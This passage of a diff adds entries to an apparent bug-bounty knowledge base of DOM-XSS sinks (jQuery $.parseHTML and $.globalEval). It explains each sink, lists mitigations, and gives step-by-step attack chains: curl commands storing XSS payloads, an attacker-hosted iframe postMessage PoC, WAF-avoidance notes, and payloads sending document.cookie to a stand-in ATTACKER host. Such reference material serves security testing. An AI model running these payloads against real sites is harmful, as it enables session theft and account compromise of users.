+      "severity_note": "P2 when the parsed nodes are inserted into the document; the third argument keepScripts=true turns inline <script> into guaranteed execution on insertion (default false since jQuery 1.8 - scripts are stripped from the returned nodes, but event attributes always survive).",
+      "explain": "$.parseHTML(htmlString [, context] [, keepScripts]) parses a string into an array of DOM nodes. Developers use it to 'sanitize' or pre-parse HTML before insertion; any attacker control of the string yields XSS once the returned nodes are appended to the document. Event-handler attributes (onerror, onload) are always preserved and execute on insertion regardless of keepScripts.",
+      "how_it_works": "parseHTML uses the native parser (createElement + innerHTML under the hood, or context.createElement) to build nodes. The keepScripts flag only controls whether <script> elements are kept in the returned node array (they are executed later, at insertion time, by jQuery's domManip/DOMEval - not during parsing). A vulnerable call looks like: $('#out').append($.parseHTML(userHtml, document, true)). Even with keepScripts=false, '<svg onload=alert(1)>' in the string executes the moment the nodes enter the document, because attribute handlers are a native-DOM behavior jQuery cannot strip.",
+      "why_it_matters": "parseHTML is frequently mistaken for a sanitizer and placed in exactly the code path meant to 'safely' render user HTML. Finding it in review is a strong lead: check the third argument, then check what happens to the returned nodes.",
+      "exploitable_when": [
+        "fetch-response",
+        "postMessage-data",
+        "location.search",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm the message body reaches $.parseHTML and insertion",
+              "payload": "window.postMessage('<b>jlf-trace</b>','*')",
+              "command": "in DevTools console on https://TARGET/page run: window.postMessage('<b>jlf-trace</b>','*')",
+              "indicator": "a bold 'jlf-trace' appears in the page, proving parse+insert of the message"
+            },
+            {
+              "action": "Deliver the payload (works even with keepScripts=false)",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "in DevTools console run: window.postMessage('<svg onload=alert(document.domain)>','*')",
+              "indicator": "the alert fires on insertion"
+            },
+            {
+              "action": "If the code passes keepScripts=true, demonstrate script execution too",
+              "payload": "<script>fetch('https://ATTACKER/c?c='+document.cookie)</script>",
+              "command": "in DevTools console run: window.postMessage('<script>fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)</script>','*')",
+              "indicator": "the cookie-bearing request hits the ATTACKER listener when the nodes are inserted"
+            }
+          ],
+          "eligibility": "Accepted when the postMessage listener lacks a strict origin check or the check is bypassable; self-posting from the console alone is just the confirmation step - deliver via an attacker page framing the target."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the API field rendered through $.parseHTML",
+              "payload": "<i>jlf-trace</i>",
+              "command": "curl -s -X POST 'https://TARGET/api/items' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<i>jlf-trace</i>\"}'",
+              "indicator": "the marker renders italicized when the item is viewed"
+            },
+            {
+              "action": "Store the executable payload",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/items' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "the alert fires for every user viewing the item"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms when it fires cross-user."
+        }
+      ],
+      "contexts": {
+        "html-body": "Parsed nodes inserted into the document: event attributes always fire; inline <script> fires only when keepScripts=true or when a later jQuery insertion executes kept scripts.",
+        "attr": "If the parsed string is concatenated into an attribute elsewhere, break out with '\"><img src=x onerror=alert(document.domain)>'.",
+        "js-string": "Not applicable at parse time; watch for the parse result being stringified back with .innerHTML reads, which re-enters html-body context."
+      },
+      "waf_notes": "Payloads delivered via postMessage or API responses avoid request-side WAF inspection. Server filters stripping <script> give a false sense of safety - <svg onload>/<img onerror> still execute, so WAF evasion rarely needed; case-variation and nested-tag mutations cover the remaining naive filters.",
+      "eligibility": "DOM/stored XSS, accepted on all major platforms. The keepScripts nuance is a severity detail, not a blocker: even the 'safe' default configuration is exploitable via event attributes, which strengthens acceptance.",
+      "mitigations": [
+        "Do not use $.parseHTML as a sanitizer - it is a parser, not a filter.",
+        "Sanitize the string with DOMPurify first: $.parseHTML(DOMPurify.sanitize(s)).",
+        "Never pass keepScripts=true for untrusted input; enforce a nonce-based CSP."
+      ],
+      "related": [
+        ".html()",
+        "innerHTML",
+        "createContextualFragment",
+        "DOMParser.parseFromString"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "jQuery API Documentation: jQuery.parseHTML()",
+        "HackTricks: jQuery DOM XSS"
+      ]
+    },
+    {
+      "id": "sink-jquery-globaleval",
+      "name": "$.globalEval()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "globalEval",
+        "$.globalEval",
+        "jQuery.globalEval",
+        ".globalEval",
+        "globaleval"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 direct JS execution in global scope when attacker data reaches the argument; P3 if the input is only indirectly influenced; requires CSP to allow 'unsafe-eval' (or no CSP) to fire.",
+      "explain": "$.globalEval(code) executes a JavaScript string in the global scope (internally via window.execScript or an indirect window.eval call). Any attacker influence over the string is arbitrary JavaScript execution in the origin - equivalent to eval().",
+      "how_it_works": "Unlike a direct eval inside a closure, globalEval deliberately escapes local scope: variables and functions it defines land on window, and it reads the global environment. It is also the engine behind jQuery's script execution for .html()/.append() (inline scripts extracted from inserted markup are passed to DOMEval/globalEval), so it appears both as an explicit sink in legacy code and implicitly wherever script-bearing HTML is inserted. Because it ultimately calls eval, a CSP without 'unsafe-eval' blocks it - check the page's CSP before claiming impact.",
+      "why_it_matters": "Global-scope code execution means full origin compromise: cookieless session tokens in JS, CSRF-token reads, and arbitrary API calls as the victim. Explicit $.globalEval(userData) in code review is an immediate high-confidence finding.",
+      "exploitable_when": [
+        "fetch-response",
+        "xhr-response",
+        "postMessage-data",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Confirm an API field is passed to $.globalEval (look for 'config', 'script', 'callback' style fields)",
+              "payload": "window.jlfTrace=1",
+              "command": "curl -s -X POST 'https://TARGET/api/widget' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"init\":\"window.jlfTrace=1\"}' then load the widget page",
+              "indicator": "typing jlfTrace in DevTools console returns 1, proving the string executed globally"
+            },
+            {
+              "action": "Deliver the exfiltration payload",
+              "payload": "fetch('https://ATTACKER/c?c='+document.cookie)",
+              "command": "curl -s -X POST 'https://TARGET/api/widget' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"init\":\"fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)\"}'",
+              "indicator": "the ATTACKER listener receives cookies from every session that loads the widget"
+            }
+          ],
+          "eligibility": "Stored JS execution, accepted on all major platforms; verify CSP allows unsafe-eval or is absent before finalizing the report."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm message data reaches $.globalEval",
+              "payload": "window.jlfTrace=2",
+              "command": "in DevTools console on https://TARGET/page run: window.postMessage('window.jlfTrace=2','*')",
+              "indicator": "jlfTrace === 2 in the console afterwards"
+            },
+            {
+              "action": "Deliver from an attacker-controlled page",
+              "payload": "<iframe src=https://TARGET/page onload=\"this.contentWindow.postMessage('fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)','*')\">",
+              "command": "host the iframe HTML on https://ATTACKER/poc.html and open it in a browser",
+              "indicator": "the cookie-bearing request arrives at the ATTACKER listener from the framed origin"
+            }
+          ],
+          "eligibility": "Accepted when the listener's origin validation is missing or bypassable; blocked entirely if CSP forbids unsafe-eval - report the missing defense-in-depth accordingly."
+        }
+      ],
+      "contexts": {
+        "html-body": "Not a markup sink - payloads are JavaScript, not HTML.",
+        "attr": "Not applicable.",
+        "js-string": "If attacker data is concatenated into the evaluated string, inject JS directly: ';alert(document.domain)// or close a string: '-alert(document.domain)-'."
+      },
+      "waf_notes": "Delivery via fetch/XHR responses or postMessage is invisible to request-side WAFs. The real control is CSP: without 'unsafe-eval' the sink is dead - always fetch the CSP header (curl -sI) and quote it in the report.",
+      "eligibility": "Arbitrary JS execution is accepted on all major platforms when CSP permits eval. If CSP blocks it, most programs treat the finding as informational/defense-in-depth unless you chain a CSP bypass.",
+      "mitigations": [
+        "Never evaluate strings from any source; pass data as JSON and parse it.",
+        "Remove 'unsafe-eval' from CSP so globalEval and friends cannot execute.",
+        "Replace dynamic-code plugin patterns with declarative configuration."
+      ],
+      "related": [
+        "eval",
+        "Function constructor",
+        "setTimeout (string argument)",
+        ".html()"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for JavaScript Execution"
+      ]
+    }
+  ]
+}
